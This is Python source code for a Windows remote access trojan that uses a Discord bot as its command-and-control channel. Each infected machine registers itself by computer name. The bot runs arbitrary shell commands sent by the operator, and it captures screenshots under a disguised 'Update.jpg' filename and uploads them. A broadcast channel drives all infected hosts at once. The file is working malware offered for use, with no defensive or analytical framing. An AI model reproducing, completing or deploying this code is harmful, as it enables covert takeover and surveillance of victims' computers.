import discord
import os
import asyncio
import requests
import urllib
import json
import ctypes
import sys
import atexit
import re
import base64
import sqlite3
import shutil
import win32crypt
import subprocess
import winreg as reg
from PIL import Image, ImageDraw
from discord.ext import commands
import win32api, win32con, win32gui, win32ui

intents = discord.Intents.all()
intents.message_content = True

whURL = ''
TOKEN = ''
serverID =  #Takes an integer

webhook = discord.SyncWebhook.from_url(whURL)
client = discord.Client(intents=intents)
guild = ''

hwid = ''

@client.event
async def on_ready():
    first_run = True
    global hwid
    global guild
    
    hwid = os.getenv("COMPUTERNAME")
    guild = client.get_guild(serverID)
   
    for category_name in guild.categories:
        if hwid == str(category_name):

            first_run = False
            break
        
    for channel in guild.channels:
        if str(channel) == 'check-in':
            await channel.send("{} has connected.".format(hwid))
            break

    if first_run:
        category = await guild.create_category(hwid)
        await guild.create_text_channel('main', category=category)              
        
@client.event
async def on_message(msg):
    if msg.author == client.user:
        return

    # If a message is sent to "main-all", each bot should execute it once
    if msg.channel.name == "main-all":
        category = discord.utils.get(msg.guild.categories, name=hwid)
        if category:
            main_channel = discord.utils.get(category.channels, name="main")
            if main_channel:
                await handle_command(msg, main_channel)  # Send results to bot's own 'main' channel
        return  # Stop further processing

    # If a message is sent to this bot's specific "main" channel, process it normally
    category = discord.utils.get(msg.guild.categories, name=hwid)
    if category:
        main_channel = discord.utils.get(category.channels, name="main")
        if main_channel and msg.channel == main_channel:
            await handle_command(msg, main_channel)

async def handle_command(msg, channel):
    prefix = b"Results of " + msg.content.encode() + b" \n\n"
    response = b""

    str_msg = msg.content.lower().strip()

    try:
        command = str_msg.split(" ", 1)[0]
        args = str_msg.split(" ", 1)[1]
    except IndexError:
        args = ""

    if str_msg.startswith(">"):
        str_msg = str_msg[1:].strip()

        for line in runCommand(str_msg):
            response += line

            if len(response) > 2000:
                t = response[2000:]
                response = response[:2000]

                await channel.send(response.decode())

                if t:
                    await channel.send(t.decode())

                response = b""

        if not response:
            response = prefix + b"Invalid Command."
        else:
            response = prefix + response

        await channel.send(response.decode())

    elif str_msg in ["ss", "screenshot"]:
        s = getScreenshot()

        if s:
            await channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.jpg"))
            os.remove("C:\\Users\\Public\\Downloads\\Update.jpg")
        else:
            await channel.send("Failed to take screenshot.")
    
def runCommand(command):
    try:
        p = subprocess.Popen(command, shell = True,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT)
        
        return iter(p.stdout.readline, b'')    
    except Exception as p:
        return p
        
#Get screenshot of current window
def getScreenshot(path=None):
    try:
        x = 0
        y = 0
        
        x2 = win32api.GetSystemMetrics(0)
        y2 = win32api.GetSystemMetrics(1)
        
        W = x2 - x
        H = y2 - y
        
        #get image data
        wDC = win32gui.GetWindowDC(None)
        dcObj = win32ui.CreateDCFromHandle(wDC)
        cDC = dcObj.CreateCompatibleDC()
        dataBitMap = win32ui.CreateBitmap()
        dataBitMap.CreateCompatibleBitmap(dcObj, W, H)
        cDC.SelectObject(dataBitMap)
        cDC.BitBlt((0, 0), (W, H), dcObj, (0, 0), win32con.SRCCOPY)

        # Capture the cursor position
        cursor_x, cursor_y = win32api.GetCursorPos()
        cursor_radius = 2  # You can adjust the size

        if path == None:
            dataBitMap.SaveBitmapFile(cDC, 'C:\\Users\\Public\\Downloads\\Update.jpg')
            img = Image.open('C:\\Users\\Public\\Downloads\\Update.jpg')
            draw = ImageDraw.Draw(img)
            draw.ellipse([cursor_x - cursor_radius, cursor_y - cursor_radius,
                      cursor_x + cursor_radius, cursor_y + cursor_radius], fill='red')
            img.save('C:\\Users\\Public\\Downloads\\Update.jpg', optimize=True)
        else:
            dataBitMap.SaveBitmapFile(cDC, path)

        #Free Resources
        dcObj.DeleteDC()
        cDC.DeleteDC()
        win32gui.ReleaseDC(None, wDC)
        win32gui.DeleteObject(dataBitMap.GetHandle())

        return True
        
    except:
        return False

def exit_handler():
    message = hwid + " has disconnected."
    
    webhook.send(message)    
           
atexit.register(exit_handler)

client.run(TOKEN)
